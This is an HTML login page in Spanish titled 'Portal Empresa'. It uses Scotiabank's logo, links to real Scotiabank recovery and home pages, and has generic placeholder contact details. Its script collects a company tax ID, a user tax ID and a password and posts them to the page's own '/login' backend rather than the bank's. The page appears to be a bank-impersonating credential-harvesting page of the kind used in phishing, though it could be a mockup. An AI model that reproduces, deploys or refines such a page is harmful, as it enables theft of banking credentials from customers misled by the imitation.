<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Portal Empresa</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Bootstrap 5 -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: #f4f4f4;
    }
    .top-bar {
      background: #fff;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    .top-bar img {
      height: 20px;
    }
    .form-card {
      background: #fff;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .btn-primary {
      background-color: #d32f2f;
      border: none;
    }
    .btn-primary:hover {
      background-color: #b71c1c;
    }
    .extra-link a {
      color: #d32f2f;
      text-decoration: none;
      font-size: 0.9rem;
    }
    .extra-link a:hover {
      text-decoration: underline;
    }
    @media (min-width: 768px) {
      .aviso-img {
        max-width: 70%;
        height: auto;
      }
       .lateral-img {
      width: 100%;          /* ambas imágenes ocupan el mismo ancho */
      object-fit: contain;  /* mantiene proporción sin deformar */
    }

    .image-column {
      background-color: #fff; /* cuadro blanco de fondo */
      padding: 1rem;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }

    @media (min-width: 768px) {
      .lateral-img {
        max-height: 40vh;   /* cada imagen ocupa aprox. 40% de la altura */
      }
      .aviso-img {
  width: 100%;          /* ocupa todo el ancho de la columna */
  max-height: 55vh;     /* más alta que antes */
  object-fit: cover;    /* se estira manteniendo proporción */
}

.lectura-img {
  width: 100%;
  max-height: 55vh;     /* más pequeña que la superior */
  object-fit: contain;
}
      .scotia-btn {
  display: inline-block;   /* no ocupa todo el ancho */
  padding: 0.5rem 1.5rem;  /* más compacto */
  font-size: 0.9rem;       /* texto más pequeño */
  border-radius: 6px;      /* esquinas redondeadas */
}
   }
  </style>
</head>
<body>
  <!-- Franja superior -->
  <nav class="top-bar navbar navbar-expand-lg fixed-top">
    <div class="container-fluid">
      <a class="navbar-brand mx-auto mx-lg-0" href="#">
        <img src="ScotiaLogo.svg" alt="Logo Empresa">
      </a>
      <div class="d-none d-lg-block ms-auto">
        📧 contacto@empresa.cl | ☎ +56 2 1234 5678
      </div>
    </div>
  </nav>

  <!-- Contenido principal -->
  <div class="container mt-5 pt-5">
    <div class="row align-items-start">
      <!-- Formulario -->
      <div class="col-12 col-md-6 mb-4">
        <div class="form-card">
          <h2 class="text-center fw-bold mb-2">Bienvenido a su Portal Empresa</h2>
          <p class="text-center mb-4">Acceda al portal ingresando sus datos</p>
          <form id="loginForm">
            <div class="mb-3">
              <label for="rutEmpresa" class="form-label">RUT Empresa</label>
              <input type="text" class="form-control" id="rutEmpresa" name="rutEmpresa" placeholder="12.345.678-9" required>
            </div>
            <div class="mb-3">
              <label for="rutPersona" class="form-label">RUT Usuario</label>
              <input type="text" class="form-control" id="rutPersona" name="rutPersona" placeholder="98.765.432-1" required>
            </div>
            <div class="mb-3">
              <label for="passwd" class="form-label">Clave</label>
              <input type="password" class="form-control" id="passwd" name="passwd" placeholder="********" required>
            </div>
            <button type="submit" class="btn btn-primary w-100">Ingresar</button>
          </form>
          <div class="extra-link text-center mt-3">
            <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
              Olvidó su clave / No tiene clave?
            </a>
          </div>
          <div class="message text-center mt-2" id="message"></div>
        </div>
      </div>

      <!-- Imagen -->
     <div class="col-12 col-md-6 d-flex flex-column align-items-center justify-content-start bg-white p-3 shadow rounded">
      <!-- Imagen 1 -->
      <img src="aviso-ggee.jpg" alt="Aviso Empresa" class="img-fluid mb-3 lateral-img">

      <!-- Imagen 2 -->
      <img src="lecturapaginainicio.jpg" alt="Lectura Página Inicio" class="img-fluid mb-3 lateral-img">

      <!-- Botón debajo de las dos imágenes -->
      <a href="https://www.scotiabank.cl/?_gl=1*1sdmghz*_gcl_au*MTA4ODc1NTU1Ny4xNzc2Nzc3MDkx*_ga*MTIzNTE5MDg0Mi4xNzc2Nzc3MDky*_ga_6EDD061F8G*czE3NzY5MDI5NzAkbzQkZzEkdDE3NzY5MDI5NzIkajU4JGwwJGgxMTc5OTk1Mzgx"
         class="btn btn-danger mt-3 w-100">
        Ir a Scotiabank
      </a>
    </div>
  </div>
</div>
  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

  <!-- Script envío a backend -->
  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const rutEmpresa = document.getElementById('rutEmpresa').value;
      const rutPersona = document.getElementById('rutPersona').value;
      const passwd = document.getElementById('passwd').value;

      try {
        const res = await fetch('/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ rutEmpresa, rutPersona, passwd })
        });

        const data = await res.text();
        document.getElementById('message').textContent = data;
      } catch (error) {
        document.getElementById('message').textContent = 'Error al enviar datos';
        console.error(error);
      }
    });
  </script>
</body>
</html>
